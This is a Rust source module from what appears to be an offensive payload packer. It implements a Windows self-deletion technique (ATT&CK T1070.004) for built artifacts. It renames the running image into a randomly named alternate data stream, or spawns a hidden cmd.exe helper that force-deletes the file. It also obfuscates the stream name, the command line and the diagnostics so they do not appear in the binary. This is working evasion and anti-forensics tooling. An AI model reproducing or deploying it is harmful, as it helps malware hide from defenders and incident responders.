//! Self-deletion.
//!
//! The artifact hides its own image while it is running: by default it renames
//! itself into an alternate data stream of its own name (the measured-to-work
//! variant — Windows refuses to delete a *mapped* image, but it allows the
//! rename, which moves the loader's bytes out of the file the path names), or,
//! with `mode: helper`, it spawns a detached helper that deletes the file once
//! the loader has exited. See `README.md` for the full write-up and the
//! measurements behind the choice of default.

use serde::{Deserialize, Serialize};

use crate::engine::obfuscation::StringsConfig;

use super::{Capability, Category, Stability, TechniqueDef};

/// How the running image is removed from the file system.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Mode {
    /// Rename the running image into an alternate data stream of its own path
    /// (`C:\x.exe` becomes `C:\x.exe:<stream>`).
    ///
    /// This is the variant that works *while the image is mapped*: the memory
    /// manager refuses to delete a mapped image (`STATUS_CANNOT_DELETE`), but a
    /// rename is allowed, and the rename moves the loader's bytes out of the
    /// default stream. The path is left behind as a zero-byte file; the payload
    /// keeps executing from the still-mapped section.
    RenameAds,
    /// Spawn a detached helper (`cmd.exe`) that waits a couple of seconds and
    /// then deletes the file, so the artifact is really gone after the loader
    /// exits.
    ///
    /// Slower and noisier than the rename — it leaves a child process and a
    /// command line behind — but it is the only variant that removes the file
    /// itself.
    Helper,
}

/// Parameters for self-deletion.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct Params {
    /// Which removal mechanism to use (see [`Mode`]).
    #[serde(default = "default_mode")]
    pub mode: Mode,
    /// Name of the alternate data stream the image is moved into, for
    /// `mode: rename_ads`.
    ///
    /// Must start with `:` and contain no path separator; the fragment rejects
    /// anything else at run time, since a bare name would rename the image to a
    /// visible sibling file instead of hiding it. Left unset the packer draws a
    /// random one per build, so the stream name is not a constant across
    /// artifacts.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub stream: Option<String>,
}

impl Default for Params {
    /// Defaults to the rename variant, the one that works on a mapped image.
    ///
    /// The manual impl keeps `Params::default()` and the `serde` field default
    /// in step: a runtime step with no `params:` mapping gets the default
    /// struct, not the field-level defaults.
    fn default() -> Self {
        Self {
            mode: default_mode(),
            stream: None,
        }
    }
}

/// Default of [`Params::mode`].
pub fn default_mode() -> Mode {
    Mode::RenameAds
}

/// A random stream name, unique per build.
fn random_stream() -> String {
    use rand::RngCore;
    let mut bytes = [0u8; 6];
    rand::thread_rng().fill_bytes(&mut bytes);
    format!(":{}", hex::encode(bytes))
}

impl Params {
    /// The stream name this build uses, the configured one or a random default.
    pub fn stream(&self) -> String {
        self.stream.clone().unwrap_or_else(random_stream)
    }

    /// Renders the self-deletion stub fragment for these parameters.
    ///
    /// The stream name and the helper's command line are rebuilt at run time from
    /// `strings`'s obfuscated bytes, so neither appears in the artifact's
    /// `.rdata`. (The target path itself is read from the running process, never
    /// embedded, so there is nothing else to obfuscate here.)
    pub fn render_fragment(&self, strings: &StringsConfig) -> String {
        let mut rendered = DEF.stub_fragment.to_string();
        for (index, (placeholder, text)) in MESSAGES.iter().enumerate() {
            rendered = rendered.replace(
                placeholder,
                &strings
                    .obfuscate(text)
                    .render_stub_expr(&format!("self_deletion_msg_{index}")),
            );
        }
        rendered
            .replace(
                "$STREAM_DEF$",
                &strings
                    .obfuscate(&self.stream())
                    .render_stub_expr("self_deletion_stream"),
            )
            .replace(
                "$HELPER_DEF$",
                &strings
                    .obfuscate("cmd.exe")
                    .render_stub_expr("self_deletion_helper"),
            )
            .replace(
                "$HELPER_ARGS_DEF$",
                &strings
                    .obfuscate("/c ping -n 3 127.0.0.1 >nul & del /f /q ")
                    .render_stub_expr("self_deletion_helper_args"),
            )
            .replace(
                "$RENAME_ADS$",
                if self.mode == Mode::RenameAds {
                    "true"
                } else {
                    "false"
                },
            )
    }
}

/// Static metadata for self-deletion.
pub const DEF: TechniqueDef = TechniqueDef {
    name: "self_deletion",
    attck: &["T1070.004"],
    stability: Stability::Stable,
    requires: &[Capability::WindowsX64, Capability::WindowsX86],
    conflicts: &[],
    category: Category::Preparation,
    doc_path: "src/techniques/self_deletion/README.md",
    stub_fragment: include_str!("stub_fragment.rs"),
    formats: &[],
    requires_indirect_syscalls: false,
    params_example: "technique: self_deletion\nparams:\n  mode: rename_ads\n",
    readme: include_str!("README.md"),
    syscalls: &["NtSetInformationFile", "NtClose"],
    resolves_imports: false,
};

/// Runtime diagnostics the fragment can emit, as `(placeholder, plaintext)`
/// pairs.
///
/// `render_fragment` replaces each placeholder with code that rebuilds the text
/// at run time (using `strings`'s active strategy), so no diagnostic lands in the
/// artifact's `.rdata`.
const MESSAGES: &[(&str, &str)] = &[
    (
        "$MSG_INVALID_STREAM$",
        "the alternate data stream name must start with ':' and contain no path separator",
    ),
    (
        "$MSG_PATH_FAILED$",
        "could not determine the running image's path",
    ),
    (
        "$MSG_OPEN_FAILED$",
        "could not open the running image for deletion",
    ),
    (
        "$MSG_RENAME_FAILED$",
        "could not move the running image into an alternate data stream",
    ),
    (
        "$MSG_HELPER_FAILED$",
        "could not start the helper that deletes the running image",
    ),
];

#[cfg(test)]
mod tests;
